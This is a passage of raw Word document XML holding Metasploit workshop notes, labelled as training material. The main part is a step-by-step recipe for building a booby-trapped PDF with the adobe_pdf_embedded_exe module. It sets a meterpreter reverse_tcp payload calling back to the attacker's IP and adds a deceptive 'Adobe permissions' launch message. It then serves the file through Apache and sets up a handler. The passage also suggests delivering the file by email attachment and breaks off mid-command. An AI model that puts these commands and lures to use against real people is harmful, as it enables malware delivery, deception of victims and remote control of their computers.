    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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sessions</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> -i &lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1040" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>📝</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Notes:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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This is a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>client-side attack</w:t>
      </w:r>
      <w:r>
        <w:t>: no direct connection to the victim system is made until the malicious file is opened.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Common social engineering techniques (like email attachments) can be used to deliver the malicious file in a real scenario.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Always ensure ethical and authorized usage during testing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>📄</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PDF Embedded Executable – </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Workshop Note</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🎯</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Objective:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To embed a malicious executable inside a PDF file that prompts the user to run it. This is a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>social engineering attack</w:t>
      </w:r>
      <w:r>
        <w:t>, not a software vulnerability exploit.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1041" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r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Background:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9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Module</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>exploit/windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>fileformat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>adobe_pdf_embedded_exe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9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  <w:r>
        <w:t xml:space="preserve">: Client-side </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>user-dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attack (requires user to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>allow execution</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9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Mechanism</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Embeds an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>.exe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> payload in a user-supplied PDF file</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1042" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2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Steps to Embed the Executable in a PDF</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🛠</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 1: Launch </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC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msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🧰</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 2: Use the Exploit Module</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC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use</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit/windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>fileformat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adobe_pdf_embedded_exe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>📥</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 3: Set the Input PDF File</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> INFILENAME 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/share/set/readme/User_Manual.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9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This PDF is available in Kali Linux as a default file.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>💣</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 4: Set the Payload</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> PAYLOAD windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>meterpreter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reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>🌐</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 5: Set LHOST</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> LHOST &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>your_attacker_IP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🖊</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 6: Set Launch Message (optional but recommended)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> LAUNCH_MESSAGE </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-string"/>
        </w:rPr>
        <w:t>"This document needs Adobe permissions to continue."</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>📝</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 7: Set Filename (optional)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> FILENAME embedded.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🚀</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 8: Generate the PDF</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC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exploit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9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File will be saved in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/root/.msf4/local/embedded.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1043" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3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Serve the PDF and Set Handler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>📤</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 9: Move the PDF to Web Server Directory</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC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builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>cp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> /root/.msf4/local/embedded.pdf /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>/www/html/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🔥</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 10: Start Apache Server (if not running)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC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service</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> apache2 start</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🔁</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 11: Set up Payload Handler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC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use</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit/multi/handler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> PAYLOAD windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>meterpreter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reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
